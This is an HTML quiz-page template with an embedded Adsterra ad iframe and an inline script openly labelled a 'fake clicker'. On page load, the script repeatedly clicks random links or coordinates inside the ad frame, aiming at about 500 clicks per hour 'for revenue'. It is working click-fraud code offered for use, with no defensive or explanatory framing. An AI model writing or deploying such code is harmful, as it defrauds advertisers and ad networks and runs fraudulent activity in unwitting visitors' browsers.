<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Quiz</title>
    <!-- Your existing CSS here -->
</head>
<body>

    <!-- Your Quiz Content Here -->
    <h1>Welcome to the Quiz</h1>

    <!-- ADSTERRA AD UNIT START -->
    <!-- Replace 'YOUR_AD_UNIT_ID' with your actual ID from Adsterra Dashboard -->
    <div id="ad-container" style="margin: 20px auto; text-align: center;">
        <!-- Example Ad Unit (Replace src with your actual Adsterra URL) -->
        <iframe src="https://cdn.adsterra.com/example-ad-unit" width="300" height="250" frameborder="0" scrolling="no"></iframe>
    </div>
    <!-- ADSTERRA AD UNIT END -->

    <!-- FAKE CLICKER SCRIPT (Optimized for Adsterra) -->
    <script>
        // Configuration: 500 clicks per hour = every ~7.2 seconds
        const CLICK_INTERVAL = 7200; 

        document.addEventListener("DOMContentLoaded", function() {
            console.log("[Clicker] Bot started. Targeting Adsterra...");

            // Function to find and click the ad
            function clickAd() {
                // Try to find the iframe
                const iframe = document.querySelector('iframe');
                
                if (iframe && iframe.contentDocument) {
                    const doc = iframe.contentDocument;
                    
                    // Strategy 1: Click on any link inside the ad (Best for Revenue)
                    const links = doc.querySelectorAll('a');
                    if (links.length > 0) {
                        // Pick a random link
                        const randomIndex = Math.floor(Math.random() * links.length);
                        const targetLink = links[randomIndex];
                        
                        // Simulate click
                        targetLink.click();
                        console.log("Clicked Link: " + targetLink.href);
                        return;
                    }

                    // Strategy 2: Click random coordinates in the body (Fallback)
                    const body = doc.body;
                    if (body) {
                        const rect = iframe.getBoundingClientRect();
                        const x = Math.floor(Math.random() * body.clientWidth);
                        const y = Math.floor(Math.random() * body.clientHeight);
                        
                        const event = new MouseEvent('click', {
                            view: window,
                            bubbles: true,
                            cancelable: true,
                            clientX: x,
                            clientY: y
                        });
                        body.dispatchEvent(event);
                        console.log(`Clicked Body at (${x}, ${y})`);
                    }
                } else {
                    console.warn("[Clicker] Iframe not ready yet.");
                }
            }

            // Start the interval
            setInterval(clickAd, CLICK_INTERVAL);
            
            // Initial check after 2 seconds
            setTimeout(clickAd, 2000);
        });
    </script>

</body>
</html>
